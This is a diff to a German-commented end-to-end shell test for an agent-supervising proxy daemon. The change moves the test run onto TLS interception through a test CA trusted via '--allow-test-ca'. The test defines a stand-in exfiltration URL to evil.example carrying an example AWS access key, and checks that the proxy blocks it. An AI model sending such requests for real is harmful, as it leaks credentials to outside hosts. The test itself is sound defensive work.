@@ -21,7 +21,11 @@
 #      Notiz, 200 mit dem Inhalt des Ziels, und 504, wo niemand entschieden hat.
 #   5. Was die Regel danach entscheidet. Eine spätere Anfrage an denselben Host
 #      erscheint nie in der Warteschlange und trägt die Id der Sitzungsregel.
-#   6. Dass eine fremde Wurzel in der Konfiguration allein nichts bewirkt.
+#   6. Der TLS-Weg. Jede Anfrage des Agenten geht über `https://`: CONNECT,
+#      Blatt aus der eigenen CA zum Agenten, Handschlag zum Ziel gegen die
+#      Wurzel aus `resolver.test_ca`, die der Daemon nur annimmt, weil dieser
+#      Lauf ihn mit `--allow-test-ca` gestartet hat (HUM-087). Die Funde weiter
+#      oben entstehen damit in entschlüsselten Rümpfen.
 #   7. Die Historie: dieselben siebzehn Flüsse, mit Filtern über Entscheidung,
 #      Grund, Funde und Regel — die Menge, aus der der Export entsteht.
 #
@@ -65,17 +69,11 @@
 #     Das ist HUM-097, nicht ein Rest, den jemand nebenbei nachreicht.
 #   * Er sagt **nichts über das HAR-Format**. Geprüft wird die Menge, aus der
 #     der Export entsteht, nicht eine geschriebene Datei und kein Feld darin.
-#   * Er **übt den MITM-Pfad nicht**. Sechzehn der siebzehn Anfragen sind
-#     Klartext-HTTP; die einzige verschlüsselte existiert, um zu scheitern.
-#     Damit laufen Blatt-Erzeugung aus der eigenen CA, der Handschlag mit dem
-#     Agenten und die TLS-Sitzung nach oben für keinen einzigen freigegebenen
-#     oder geblockten Fluss — für die Hauptbauart des Produkts fehlt hier
-#     Abdeckung, sie fehlt nicht bloß in dieser Fassung. Sie kommt zurück,
-#     sobald `--allow-test-ca` da ist (HUM-087).
-#   * Schritt 7 hält eine **Abwesenheit** fest, keine Verweigerung: Der Daemon
-#     liest `resolver.test_ca` heute gar nicht, er lehnt die Wurzel nicht
-#     bewusst ab. Sobald er das Flag kennt, dreht sich der Schritt um; der
-#     Stolperdraht darüber sorgt dafür, dass das nicht unbemerkt bleibt.
+#   * Er sagt **nichts über eine Verweigerung ohne das Flag**. Dieser Lauf
+#     fährt mit `--allow-test-ca`; dass dieselbe Wurzel ohne das Flag **nicht**
+#     gilt, misst der Rust-Test `a_test_ca_is_only_trusted_with_the_flag` in
+#     `daemon/bin/humanitld/tests/daemon_end_to_end.rs`. Eine zweite
+#     Daemon-Instanz nur für diese Richtung stünde hier nicht (HUM-087).
 #   * Er sagt nichts über eine zweite Sitzung, über Neustarts (das prüft M1),
 #     über OpenCode (HUM-046) und über Benachrichtigungen (abgeschaltet).
 #
@@ -109,7 +107,7 @@ M2_UI_TEST="$E2E_ROOT/app/integration_test/m2_first_decision_test.dart"
 # Selbstprüfung am Ende vergleicht die Zahl mit dem Zähler aus `lib.sh`. Ein
 # Skript, das grün ist, weil ein Zweig übersprungen wurde, ist schlimmer als
 # keines; deshalb steht die Zahl hier und nicht im Kopf eines Menschen.
-M2_EXPECTED_ASSERTIONS=59
+M2_EXPECTED_ASSERTIONS=69
 
 # Die Ports des Ziels. Im eigenen Netz-Namensraum ist der Lauf root und darf
 # auch die privilegierten binden; damit braucht der Proxy keine Portumlenkung
@@ -127,9 +125,9 @@ M2_HOLD_TIMEOUT=10
 M2_HOSTS="registry.npmjs.org api.github.com evil.example"
 
 # Die drei Adressen, an denen der Lauf den Agenten festnagelt.
-M2_URL_BLOCKED='http://evil.example/exfil?d=AKIAIOSFODNN7EXAMPLE'
-M2_URL_ALLOWED='http://api.github.com/graphql'
-M2_URL_TIMEOUT='http://api.github.com/repos/x/y'
+M2_URL_BLOCKED='https://evil.example/exfil?d=AKIAIOSFODNN7EXAMPLE'
+M2_URL_ALLOWED='https://api.github.com/graphql'
+M2_URL_TIMEOUT='https://api.github.com/repos/x/y'
 M2_URL_TLS='https://registry.npmjs.org/tls-probe'
 
 # Der Pfad der positiven Kontrolle zu Schritt 7. Sie geht am Proxy vorbei,
@@ -319,7 +317,12 @@ e2e_say "test CA in $M2_CA_DIR, valid for $M2_HOSTS"
 
 m2_start_upstream
 m2_write_config
-start_daemon "$E2E_WORKDIR/state" "$E2E_WORKDIR" "$M2_HOLD_TIMEOUT"
+# `--allow-test-ca` ist das, was diesen Lauf über TLS fahren lässt (HUM-087).
+# Es steht hier im Startbefehl und nicht in einer Umgebungsvariablen: Ein Flag,
+# das das Vertrauen des Daemons erweitert, soll an genau einer sichtbaren
+# Stelle stehen. Ohne es scheiterte jeder Handschlag nach oben mit `502
+# upstream_tls`, und der Lauf käme über Schritt 1 nicht hinaus.
+start_daemon "$E2E_WORKDIR/state" "$E2E_WORKDIR" "$M2_HOLD_TIMEOUT" --allow-test-ca
 
 # Der Beleg, dass das Ziel antwortet, bevor irgendwo behauptet wird, eine
 # Anfrage sei nicht bei ihm angekommen. Ohne diese Zeile hieße ein
@@ -364,23 +367,48 @@ else
         "$configured_ca is missing, empty or not PEM"
 fi
 
-# Der Stolperdraht zu Schritt 7. Dessen drei Behauptungen prüfen ein Ergebnis
-# (der Handschlag nach oben scheitert) und würden auch dann grün bleiben, wenn
-# der Daemon `--allow-test-ca` längst kennt: `start_daemon` startet ihn ohne das
-# Flag, die Wurzel bliebe ungenutzt, die Probe bliebe 502 — der Mangel wäre weg,
-# die Zusicherung stünde weiter. Deshalb wird hier die Kommandozeilen-Fläche
-# selbst geprüft, und nicht ihr Ergebnis.
+# Der Stolperdraht zu Schritt 7, umgedreht (HUM-087). Bis das Flag existierte,
+# sicherte er zu, dass es der Daemon **nicht** kennt, und starb, sobald das
+# nicht mehr stimmte. Jetzt sichert er die andere Hälfte derselben Aussage zu:
+# dass dieser Lauf das Flag wirklich benutzt. Ohne ihn stünden die
+# Behauptungen von Schritt 7 auf einem Ergebnis, das auch aus einem ganz
+# anderen Grund eintreten könnte — etwa weil jemand die Wurzel doch ohne Flag
+# gelten ließe. Geprüft wird deshalb wieder die Fläche und nicht nur ihre
+# Wirkung: die Kommandozeile des Binaries, der Startbefehl dieses Laufs, und
+# die Zeile, mit der der Daemon selbst sagt, was er geladen hat.
 if "$E2E_DAEMON" --help 2>&1 | grep -q -- '--allow-test-ca'; then
-    e2e_check "humanitld still has no --allow-test-ca, so step 7 still means what it says" no \
-        "humanitld now knows --allow-test-ca. Turn step 7 around: start the daemon with the flag (E2E_DAEMON_ARGS or start_daemon), put the URLs in script.json on https://, and expect 200 with the content of the target instead of 502 upstream_tls. Then rewrite this check and CONVENTIONS.md 4.22."
+    e2e_check "humanitld offers --allow-test-ca, the switch step 7 rests on" ok
+else
+    e2e_check "humanitld offers --allow-test-ca, the switch step 7 rests on" no \
+        "humanitld no longer knows --allow-test-ca. Either it was removed, then step 7 has to go back to expecting 502 upstream_tls and the URLs in script.json back to http:// (see CONVENTIONS.md 4.22), or it was renamed, then this run has to start the daemon with the new name."
 fi
-e2e_check "humanitld still has no --allow-test-ca, so step 7 still means what it says" ok
+
+# Und dass dieser Lauf es auch übergeben hat. `DAEMON_ARGV` kommt aus
+# `start_daemon` und ist das, was wirklich an `humanitld` ging; eine Prüfung
+# auf die Konstante im Skript sagte nur, was jemand hinschreiben wollte.
+e2e_expect_match "and this run started the daemon with it" \
+    '(^| )--allow-test-ca( |$)' "$DAEMON_ARGV"
 
 # Und der Daemon sagt es auch selbst, statt dass der Lauf es aus einem
-# Ausbleiben schließt.
-e2e_expect_match "and the daemon says on its own that it ignores the key" \
-    'resolver\.test_ca is set but the daemon does not read it yet' \
-    "$(cat "$DAEMON_LOG")"
+# Ausbleiben schließt: eine Zeile mit der Zahl der geladenen Wurzeln und dem
+# Pfad, aus dem sie kommen, auf der Stufe `WARN` (docs/SECURITY.md 5).
+daemon_trust_line=$(grep -F -- '--allow-test-ca' "$DAEMON_LOG" | head -n 1)
+e2e_expect_match "and the daemon says on its own that it loaded the root" \
+    '"roots":1' "$daemon_trust_line"
+e2e_expect_match "and names the file it loaded it from" \
+    "\"path\":\"$M2_CA_DIR/test-ca.crt\"" "$daemon_trust_line"
+e2e_expect_match "and says it at the level a widened trust deserves" \
+    '"level":"WARN"' "$daemon_trust_line"
+
+# Und dass er nichts zu bemängeln hatte: `CONFIG_011` steht im Protokoll, wenn
+# Flag und Schlüssel nicht zusammenpassen, `CONFIG_010` wenn die Datei
+# unbrauchbar ist. Beides hieße, dass dieser Lauf gar keine fremde Wurzel
+# benutzt, und Schritt 7 belegte dann etwas anderes als er sagt.
+if grep -q -E 'CONFIG_01[01]' "$DAEMON_LOG"; then
+    e2e_check "and the daemon had nothing to complain about the pair" no \
+        "$(grep -E -m 1 'CONFIG_01[01]' "$DAEMON_LOG")"
+fi
+e2e_check "and the daemon had nothing to complain about the pair" ok
 
 # Und dass die Sandbox mitbringt, was der Agent gleich braucht. Beides liegt
 # unter /usr, das jedes Profil nur lesbar einhängt; fehlt es, soll die Meldung
@@ -539,10 +567,11 @@ e2e_expect_match "and seccomp was active in the agent process" \
 
 e2e_step "5. what the agent got back"
 
-# Zwölf aus dem Stapel und die spätere Anfrage, die die Regel erlaubt hat.
-npm_ok=$(jq -r 'select(.url | startswith("http://registry.npmjs.org/")) | .status' \
+# Zwölf aus dem Stapel, die spätere Anfrage, die die Regel erlaubt hat, und die
+# TLS-Probe, die seit HUM-087 durchkommt: vierzehn.
+npm_ok=$(jq -r 'select(.url | startswith("https://registry.npmjs.org/")) | .status' \
     "$M2_AGENT_LOG" | grep -c '^200$' || true)
-e2e_expect "the released requests answer with the content of the target" 13 "$npm_ok"
+e2e_expect "the released requests answer with the content of the target" 14 "$npm_ok"
 
 e2e_expect "the blocked request ends as 403" 403 \
     "$(m2_agent_field "$M2_URL_BLOCKED" status)"
@@ -571,32 +600,55 @@ e2e_expect "and it never waited for one" recorded \
 
 # --- 7. Die fremde Wurzel ----------------------------------------------------
 
-e2e_step "7. a test CA in the configuration is not trusted on its own"
+e2e_step "7. the test CA in the configuration is trusted, because the flag says so"
 
 # `resolver.test_ca` zeigt auf die Wurzel, mit der der Fake-Upstream sein
-# TLS-Zertifikat unterschrieben hat. Der Schlüssel allein darf nichts bewirken:
-# erst das ausdrückliche Flag des Daemons macht die Wurzel gültig, und solange
-# es dieses Flag nicht gibt, liest der Daemon den Schlüssel gar nicht
-# (`backlog/CONVENTIONS.md` 4.22). Belegt wird das an der Anfrage, die die
-# Sitzungsregel ohne jede Rückfrage erlaubt hat: Sie scheitert am Handschlag
-# zum Ziel, statt eine Antwort zu bekommen.
-e2e_expect "the TLS request reaches the proxy and fails there" 502 \
+# TLS-Zertifikat unterschrieben hat, und der Daemon dieses Laufs ist mit
+# `--allow-test-ca` gestartet. Beide Hälften zusammen machen die Wurzel gültig;
+# eine allein bewirkt nichts (`docs/SECURITY.md` 5, HUM-087). Belegt wird das
+# an der Anfrage, die die Sitzungsregel ohne jede Rückfrage erlaubt hat: Sie
+# kommt durch den Handschlag zum Ziel und bringt dessen Antwort mit.
+e2e_expect "the TLS request goes through the proxy to the target" 200 \
     "$(m2_agent_field "$M2_URL_TLS" status)"
-e2e_expect "the flow says the handshake to the target failed" upstream_tls \
+
+# Der Status allein sagt zu wenig: Eine `200` könnte auch vom Proxy selbst
+# kommen, vom Meta-Endpunkt oder von irgendeinem anderen Gegenüber. Geprüft
+# wird deshalb der Rumpf, den der Agent gesehen hat — es ist die Antwort des
+# Fake-Upstreams, mit dem Pfad und dem Host, nach denen gefragt wurde.
+tls_body=$(m2_agent_field "$M2_URL_TLS" body_head)
+e2e_expect "and the body is the answer of the target, not of anyone else" \
+    /tls-probe "$(printf '%s' "$tls_body" | jq -r '.path // ""' 2> /dev/null || true)"
+e2e_expect "and the target saw the host the agent asked for" \
+    registry.npmjs.org \
+    "$(printf '%s' "$tls_body" | jq -r '.host // ""' 2> /dev/null || true)"
+
+e2e_expect "the flow carries no upstream error any more" "" \
     "$(m2_field 'path:/tls-probe' error)"
-e2e_expect "and it was allowed before it failed, so nobody was asked" allow \
+e2e_expect "and it was allowed without anybody being asked" allow \
     "$(m2_field 'path:/tls-probe' decision)"
 
-# Die Gegenprobe, ohne die der Schritt nichts sagt: `502 upstream_tls` entsteht
-# genauso, wenn das Blatt für die falschen Hosts gälte, abgelaufen wäre oder
-# von einer fremden Wurzel stammte. Ein Klient im selben Namensraum, mit
-# derselben Wurzel und ohne Proxy, schafft den Handschlag — und ohne die Wurzel
-# scheitert er. Damit ist belegt, was der Schritt voraussetzt: Das Material ist
-# gültig, und was ihm fehlt, ist allein das Vertrauen des Daemons.
+# Und der Proxy stand dabei wirklich in der Mitte: Der Agent hat das Blatt der
+# Humanitl-CA gesehen (sonst hätte `curl` mit seinem `CURL_CA_BUNDLE` den
+# Handschlag abgebrochen), der Daemon das Blatt des Ziels. Zwei getrennte
+# TLS-Sitzungen, und der Fund im entschlüsselten Rumpf der POST-Anfrage weiter
+# oben belegt, dass dazwischen wirklich Klartext lag. Die Zeile der
+# Flow-Liste trägt kein Schema-Feld; was sie trägt, ist der Port, und der ist
+# der des TLS-Listeners.
+e2e_expect "and the flow went to the TLS port of the target" "$M2_HTTPS_PORT" \
+    "$(m2_row 'path:/tls-probe' | jq -r '.authority.port // 0')"
+
+# Die Gegenprobe, ohne die der Schritt weniger sagt: Ein Klient im selben
+# Namensraum, mit derselben Wurzel und ohne Proxy, schafft den Handschlag — und
+# ohne die Wurzel scheitert er. Sie belegt, dass das Material gültig ist und
+# dass eine Prüfung dagegen überhaupt etwas entscheidet; ein Ziel, dem jeder
+# vertraute, machte Schritt 7 wertlos. Die Richtung „ohne Flag gilt die Wurzel
+# nicht" misst der Rust-Test `a_test_ca_is_only_trusted_with_the_flag`, nicht
+# eine zweite Daemon-Instanz in diesem Lauf.
 #
 # `--noproxy '*'` und `--resolve`: Der Aufruf geht direkt zum Ziel, nicht über
-# den Proxy, und mit dem Namen, für den das Blatt gilt. Der eigene Pfad hält
-# die Null-Zählung für `/tls-probe` sauber.
+# den Proxy, und mit dem Namen, für den das Blatt gilt. Der eigene Pfad
+# `/tls-control` trennt diese Anfrage im Protokoll des Ziels von der, die durch
+# den Proxy ging; die Gegenprobe in Schritt 9 zählt beide getrennt.
 control=$(curl -sS --max-time 5 --noproxy '*' \
     --cacert "$M2_CA_DIR/test-ca.crt" \
     --resolve "registry.npmjs.org:$M2_HTTPS_PORT:$E2E_FAKE_ADDR" \
@@ -643,30 +695,42 @@ e2e_expect "and twelve by a human, each without a rule behind it" 12 "$by_human"
 
 e2e_step "9. the counter-check at the target"
 
-# Die Gegenprobe zu allem, am selben Ziel. Bedient hat es sechzehn Anfragen:
-# die Erreichbarkeits-Probe, die vierzehn, die ein Mensch oder seine Regel
+# Die Gegenprobe zu allem, am selben Ziel. Bedient hat es siebzehn Anfragen:
+# die Erreichbarkeits-Probe, die fünfzehn, die ein Mensch oder seine Regel
 # erlaubt hat, und die positive TLS-Kontrolle aus Schritt 7 — und keine einzige
 # darüber hinaus. Was ein Mensch verboten hat, steht null Mal in seinem
-# Protokoll; was niemand entschieden hat, ebenso wenig; und die TLS-Anfrage
-# durch den Proxy kam nie über den Handschlag hinaus.
+# Protokoll, und was niemand entschieden hat, ebenso wenig.
+#
+# Sechzehn waren es, solange die TLS-Anfrage am Handschlag scheiterte; mit
+# `--allow-test-ca` kommt sie durch, und das ist genau die Anfrage, die dieses
+# Issue zurückgeholt hat (HUM-087).
 served=$(grep -c ' 200 [0-9]*$' "$M2_UPSTREAM_LOG" || true)
-e2e_expect "the target served the two probes and the fourteen allowed requests" \
-    16 "$served"
+e2e_expect "the target served the two probes and the fifteen allowed requests" \
+    17 "$served"
 e2e_expect "and never the request a human forbade" 0 "$(m2_upstream_hits '/exfil')"
 e2e_expect "and never the one nobody decided" 0 "$(m2_upstream_hits '/repos/x/y')"
 
-# Und die Anfrage durch den Proxy kam nie über den Handschlag hinaus. Eine
-# Suche nach `/tls-probe` im Protokoll wäre dafür keine Prüfung: Scheitert der
-# Handschlag, schreibt das Ziel überhaupt keine Zeile, die Zahl wäre also aus
-# strukturellen Gründen null und könnte gar nicht anders ausfallen. Gezählt
-# werden deshalb die TLS-Anfragen, die das Ziel bedient hat — es muss genau
-# eine sein, und zwar die Kontrolle. Vertraute der Daemon der Testwurzel, käme
-# eine zweite dazu, und diese Zahl fiele um.
+# Und der ganze Verkehr des Agenten lief über die TLS-Terminierung. Gezählt
+# wird nach dem Schema, unter dem das Ziel die Anfrage angenommen hat: Alles
+# außer der Erreichbarkeits-Probe kam über TLS an. Das ist die Abdeckung, die
+# vor HUM-087 fehlte — sechzehn der siebzehn Anfragen waren Klartext, und die
+# einzige verschlüsselte existierte, um zu scheitern.
 tls_served=$(awk '$2 == "https" { n++ } END { print n + 0 }' "$M2_UPSTREAM_LOG")
-e2e_expect "the target served exactly one TLS request" 1 "$tls_served"
-e2e_expect "and it was the control, not the one that went through the proxy" \
-    "$M2_PATH_TLS_CONTROL" \
-    "$(awk '$2 == "https" { print $5 }' "$M2_UPSTREAM_LOG")"
+plain_served=$(awk '$2 == "http" { n++ } END { print n + 0 }' "$M2_UPSTREAM_LOG")
+e2e_expect "the target served sixteen requests over TLS" 16 "$tls_served"
+e2e_expect "and exactly one in the clear, the reachability probe" 1 "$plain_served"
+e2e_expect "and that one really was the probe" /reachable \
+    "$(awk '$2 == "http" { print $5 }' "$M2_UPSTREAM_LOG")"
+
+# Und die Anfrage, die durch den Proxy ging, kam genau einmal an. Die Kontrolle
+# aus Schritt 7 zählt getrennt, weil sie einen eigenen Pfad hat: Ohne diese
+# Trennung wäre nicht zu sehen, welche der beiden das Ziel wirklich erreicht
+# hat.
+e2e_expect "the request through the proxy reached the target exactly once" 1 \
+    "$(awk '$2 == "https" && $5 == "/tls-probe" { n++ } END { print n + 0 }' "$M2_UPSTREAM_LOG")"
+e2e_expect "and so did the control that went past it" 1 \
+    "$(awk -v path="$M2_PATH_TLS_CONTROL" \
+        '$2 == "https" && $5 == path { n++ } END { print n + 0 }' "$M2_UPSTREAM_LOG")"
 
 # --- 10. Die Oberfläche ------------------------------------------------------
 
